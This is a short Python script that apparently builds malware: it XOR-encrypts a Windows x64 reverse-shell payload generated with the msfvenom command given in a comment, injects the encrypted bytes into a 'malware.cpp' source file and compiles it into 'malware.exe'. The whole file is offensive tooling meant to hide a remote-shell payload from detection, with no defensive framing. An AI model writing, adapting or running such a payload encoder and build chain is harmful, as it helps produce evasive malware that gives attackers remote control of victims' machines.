#Require Python3
import sys
import os

# XOR function to encrypt data
def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""
    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        ordd = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(ordd(current) ^ ord(current_key))
    return output_str

# XOR encrypting process
def xor_encrypt(data, key):
    ciphertext = xor(data, key)
    ciphertext_hex = ', 0x'.join(hex(ord(x))[2:] for x in ciphertext)
    ciphertext_formatted = '{{ 0x{}, }};'.format(ciphertext_hex)
    print(ciphertext_formatted)
    return ciphertext_formatted, key

# master key
my_secret_key = "handler()"

# payload from the msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f raw -o payload.bin
plaintext = open("payload.bin", "rb").read()
ciphertext, p_key = xor_encrypt(plaintext, my_secret_key)

# open and replace the malware.cpp file
with open("malware.cpp", "r") as file:
    data = file.read()
    data = data.replace('unsigned char payload[] = {};', 'unsigned char payload[] = ' + ciphertext)

with open("malware.cpp", "w") as file:
    file.write(data)

# compile
cmd = "cl.exe malware.cpp /Fe:malware.exe /EHsc /MT /O2"
os.system(cmd)
